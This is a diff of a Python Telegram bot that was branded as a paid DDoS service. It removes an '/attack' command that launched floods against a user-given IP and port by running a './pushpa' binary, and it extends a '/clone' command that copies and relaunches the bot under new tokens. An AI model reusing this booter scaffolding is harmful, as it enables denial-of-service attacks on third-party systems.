@@ -26,8 +26,7 @@ approved_ids = load_approved_ids()
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒  *\n"
-        "*PRIMIUM DDOS BOT*\n"
+        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐁𝐎𝐓*\n"
         "*OWNER :- @GODxAloneBOY*\n"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
@@ -71,66 +70,12 @@ async def remove(update: Update, context: CallbackContext):
     else:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')
 
-# Attack command (only for approved users and groups)
-async def attack(update: Update, context: CallbackContext):
-    global attack_in_progress
-
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-    args = context.args
-
-    if str(chat_id) not in approved_ids and user_id not in approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
-        return
-
-    if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="* Please wait 3 to 5 minutes for the next attack.*", parse_mode='Markdown')
-        return
-
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*  example » /attack ip port time*", parse_mode='Markdown')
-        return
-
-    ip, port, time = args
-    await context.bot.send_message(chat_id=chat_id, text=(
-        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
-        f"*⭐ Target » {ip}*\n"
-        f"*⭐ Port » {port}*\n"
-        f"*⭐ Time » {time} seconds*\n"
-        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
-    ), parse_mode='Markdown')
-
-    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
-
-# Run attack function
-async def run_attack(chat_id, ip, port, time, context):
-    global attack_in_progress
-    attack_in_progress = True
-
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./pushpa {ip} {port} {time} 500",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-
-    finally:
-        attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')
-
 # Clone command
 async def clone(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
+    args = context.args
 
+    # Only the admin can use this command
     if chat_id != ADMIN_USER_ID:
         await context.bot.send_message(
             chat_id=chat_id,
@@ -139,27 +84,42 @@ async def clone(update: Update, context: CallbackContext):
         )
         return
 
+    # Ensure the bot token is provided
+    if len(args) != 1:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="* Usage » /clone <new_bot_token>*",
+            parse_mode='Markdown'
+        )
+        return
+
+    new_bot_token = args[0].strip()  # Get the new bot token from arguments
+
     try:
-        new_bot_token = "NEW_TELEGRAM_BOT_TOKEN_HERE"  # Replace with an actual token
+        # Path for the cloned bot
         clone_path = "./bot_clone"
         if not os.path.exists(clone_path):
             os.makedirs(clone_path)
 
+        # Copy the current bot files to the cloned directory
         os.system(f"cp -r ./ {clone_path}")
 
+        # Replace the token in the cloned bot's code
         with open(os.path.join(clone_path, "bot.py"), "r") as file:
             bot_code = file.read().replace(TELEGRAM_BOT_TOKEN, new_bot_token)
 
         with open(os.path.join(clone_path, "bot.py"), "w") as file:
             file.write(bot_code)
 
+        # Run the cloned bot
         os.system(f"nohup python3 {os.path.join(clone_path, 'bot.py')} &")
 
         await context.bot.send_message(
             chat_id=chat_id,
-            text="*✅ Bot cloned and deployed successfully.*",
+            text="*✅ Bot cloned and deployed successfully with the new token.*",
             parse_mode='Markdown'
         )
+
     except Exception as e:
         await context.bot.send_message(
             chat_id=chat_id,
@@ -173,7 +133,6 @@ def main():
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("approve", approve))
     application.add_handler(CommandHandler("remove", remove))
-    application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("clone", clone))
     application.run_polling()
 
